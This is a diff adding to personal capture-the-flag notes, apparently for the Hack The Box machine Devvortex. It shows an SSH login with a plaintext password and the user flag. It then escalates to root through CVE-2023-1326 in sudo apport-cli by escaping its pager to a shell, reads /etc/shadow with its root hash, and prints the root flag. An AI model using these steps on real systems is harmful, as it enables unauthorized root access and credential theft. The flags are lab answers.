@@ -204,4 +204,33 @@ linpeas.txt - sudo = 1.8.31
 
 	ssh logan@devvortex.htb
 	tequieromucho
+
+	cat /home/logan/user.txt
+	ac1b6a2b402cdfa04a15be3c61cd01e5
+
+```
+
+```bash
+	sudo -l
+	User logan may run the following commands on devvortex:
+    	(ALL : ALL) /usr/bin/apport-cli
+
+	https://diegojoelcondoriquispe.medium.com/cve-2023-1326-poc-c8f2a59d0e00
+
+    less /etc/profile
+    !/bin/sh
+
+    sudo /usr/bin/apport-cli --file-bug
+    1
+    2
+    ENTER
+    V
+
+	!/bin/bash
+
+	cat /etc/shadow
+	root:$6$kdYdkbdlt4MMS7Qx$/lIiEByq.cgsQPyd82QDfhA/Qb5IgaukiUN0OOKewugqr1qeFFiQ4t2sAdiyAmUssoeg3.h1k/2BpdTRthmum.:19654:0:99999:7:::
+
+	cat /root/root.txt 
+	cfb343c3b91503a88b509b6125d83f52
 ```
